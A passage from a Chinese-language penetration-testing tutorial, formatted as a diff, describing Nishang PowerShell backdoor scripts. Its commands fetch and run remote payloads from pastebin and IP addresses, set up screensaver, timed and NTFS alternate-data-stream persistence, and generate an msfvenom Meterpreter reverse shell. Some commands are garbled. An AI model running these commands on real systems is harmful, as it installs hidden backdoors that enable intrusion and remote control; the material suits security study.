+- -OutputFile 输出的文件名
+- -WordFileDir 输出的目录地址
+- -Recurse 在WordFileDir中递归寻找Word文件
+- -RemoveDocx 创建完成后删除掉原始的文件
+
+
+
+#### 后门
+
+##### 1.HTTP-Backdoor
+
+HTTP-Backdoor可以帮助我们在目标机器上下载和执行PowerShell脚本，接收来自第三方网站的指令，然后在内存中执行PowerShell脚本，其语法如下所示。
+
+```
+TTP-Backdoor –CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x-PayloadURL
+```
+
+```
+TTP-Backdoor –CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh-MagicString start123-StopString stopthis
+```
+
+具体的参数介绍如下
+
+- CheckURL	##给出一个URL地址，如果存在，MagicString中的值就执行Payload来下载、运行我们的脚本
+- PayloadURL	##给出需要下载的PowerShell脚本的地址
+- Arguments	##指定要执行的函数
+- StopString	##判断是否存在CheckURL返回的字符串，如果存在则停止执行
+
+
+
+##### 2.Add-ScrnSaveBackdoor
+
+这个脚本可以帮助我们利用Windows的屏保来留下一个隐藏的后门
+
+```
+Add-ScrnSaveBackdoor -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process"	#该命令可以执行我们生产的Payload
+
+Add-ScrnSaveBackdoor -PayloadURL http://xxx/Powerpreter.psml -Arguments HTTP-Backdoor	#该命令可以在PowerShell中执行一个
+
+Add-ScrnSaveBackdoor -PayloadURL http://XXX/code_exec.ps1
+```
+
+也可以使用msfvenom先生成一个PowerShell，然后利用以下命令返回一个Meterpreter
+
+```
+msfvenom-p windows/x64/meterpreter/reverse_https LHOST=192.168.254.226-f powers hell
+```
+
+具体的参数介绍如下
+
+- PayloadURL　##指定需要下载的脚本地址
+- Arguments　 ##指定要执行的函数以及相关参数
+
+
+
+##### 3.Execute-OnTime
+
+Execute-OnTime可以在目标机上指定PowerShell脚本的执行时间，与HTTP–Backdoor的使用方法相似，只不过多了定时的功能
+
+```
+Execute-OnTime-PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh-Arguments Get-Information-Time hh:mm-CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh-St opString stoppayload
+```
+
+具体的参数介绍如下
+
+- PayloadURL　##指定脚本下载的地址
+- Arguments　##指定执行的函数名
+- Time　　　　##设定脚本执行的时间（例如-Time 23:21）
+- CheckURL　##会检测一个指定的URL内容里是否存在StopString给出的字符串，如果发现了就停止执行
+
+
+
+##### 4.Invoke-ADSBackdoor
+
+这个脚本使用NTFS数据流留下一个**永久性后门**。这种方法可以说是最恐怖的，因为这样留下的后门几乎是永久的，也不容易被发现。
+
+这个脚本可以**向ADS中注入代码并且以普通用户的权限运行**，输入以下命令即可执行该脚本
+
+```
+Invoke-ADSBackdoor-PayloadURL http://192.168.12.110/test.ps1
+```
+
+执行该脚本之后，如果目标用户手动找根本不会找到任何东西，使用命令`dir/a/r`才能看到被写入的文件
+
+![image-20210405154853423](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210405154853423.png)
+
+Nishang这款基于PowerShell的渗透测试专用工具集成了非常多的实用脚本与框架，方便我们在渗透测试的过程中使用。尽管，在一些环境下可能没有办法执行PowerShell，但是通过查看这些脚本的具体代码，我们也可以自己去实现脚本提供的一些功能。
+
+
+
+## 实例分析
+
+
+
+
+
